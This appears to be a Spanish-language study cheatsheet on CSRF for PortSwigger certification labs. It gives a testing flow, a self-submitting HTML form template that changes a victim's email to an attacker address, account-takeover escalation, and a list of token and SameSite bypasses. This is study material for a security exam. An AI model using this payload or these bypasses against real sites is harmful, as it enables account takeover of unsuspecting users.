---
tipo: cheatsheet
vuln: csrf
tags: [bscp, tipo/cheatsheet, vuln/csrf]
relacionada: "[[CSRF]]"
---

# CS · CSRF

## Flujo repetible
1. Localiza una acción que cambia estado en {{BASE}}.
2. Comprueba defensa: token presente, ligado a sesión, SameSite.
3. Construye PoC que auto-envía desde {{EXPLOIT}}.

## Detección
```html
<!-- ¿La acción de cambio de estado en {{BASE}} valida token/SameSite? -->
<!-- Repite la petición sin el token o cambiando POST->GET para confirmar debilidad -->
```

## Plantillas de payload
```html
<form action="{{BASE}}/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

## Escalada al objetivo
Fuerza a {{VICTIM}} a cambiar su email/contraseña → toma de cuenta.
Bypasses: quitar token · POST→GET · token no ligado a sesión · token en cookie · SameSite Lax con GET.

## Checklist
- [ ] Confirmé ausencia/debilidad del token
- [ ] PoC auto-envía y cambia estado
- [ ] Probé al menos un bypass si había token

## Referencias
- https://portswigger.net/web-security/csrf
